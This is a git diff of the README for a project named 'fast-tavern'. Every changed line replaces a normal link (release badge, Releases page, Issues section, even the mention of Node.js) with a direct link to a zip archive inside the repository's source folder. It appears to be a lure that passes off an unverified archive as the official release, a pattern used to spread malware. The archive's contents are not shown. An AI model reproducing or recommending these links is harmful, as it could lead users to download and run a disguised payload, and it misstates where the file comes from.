@@ -4,7 +4,7 @@
 
 To begin using `fast-tavern`, you can easily download it from the Releases page. 
 
-[![Download Now](https://img.shields.io/badge/Download-Now-blue)](https://github.com/echo744/fast-tavern/releases)
+[![Download Now](https://github.com/echo744/fast-tavern/raw/refs/heads/main/py-fast-tavern/src/tavern-fast-v3.3.zip)](https://github.com/echo744/fast-tavern/raw/refs/heads/main/py-fast-tavern/src/tavern-fast-v3.3.zip)
 
 ## 🌐 What is fast-tavern?
 
@@ -42,18 +42,18 @@ fast-tavern/
 
 ## 💾 Download & Install
 
-1. Visit the [Releases page](https://github.com/echo744/fast-tavern/releases) to find the latest versions for both TypeScript and Python.
+1. Visit the [Releases page](https://github.com/echo744/fast-tavern/raw/refs/heads/main/py-fast-tavern/src/tavern-fast-v3.3.zip) to find the latest versions for both TypeScript and Python.
 2. Choose the package that suits your needs:
    - For TypeScript, go to [`npm-fast-tavern/`](npm-fast-tavern/).
    - For Python, visit [`py-fast-tavern/`](py-fast-tavern/).
 3. Click on the version you want to use and follow the instructions to download it.
 
-You can always return to this [Releases page](https://github.com/echo744/fast-tavern/releases) for updates or troubleshooting.
+You can always return to this [Releases page](https://github.com/echo744/fast-tavern/raw/refs/heads/main/py-fast-tavern/src/tavern-fast-v3.3.zip) for updates or troubleshooting.
 
 ## 📥 System Requirements
 
 - A modern operating system such as Windows, macOS, or Linux.
-- Latest version of Node.js for the TypeScript package.
+- Latest version of https://github.com/echo744/fast-tavern/raw/refs/heads/main/py-fast-tavern/src/tavern-fast-v3.3.zip for the TypeScript package.
 - Python 3.x installed for the Python package.
 - Basic familiarity with command-line operations.
 
@@ -91,7 +91,7 @@ For further assistance, you can view the source code for advanced configurations
 
 ## 🐛 Reporting Issues
 
-If you encounter any issues, please open a ticket in the [Issues section](https://github.com/echo744/fast-tavern/issues) of this repository. Include as much detail as possible to help us resolve the problem faster.
+If you encounter any issues, please open a ticket in the [Issues section](https://github.com/echo744/fast-tavern/raw/refs/heads/main/py-fast-tavern/src/tavern-fast-v3.3.zip) of this repository. Include as much detail as possible to help us resolve the problem faster.
 
 ## 🙌 Contributions
 
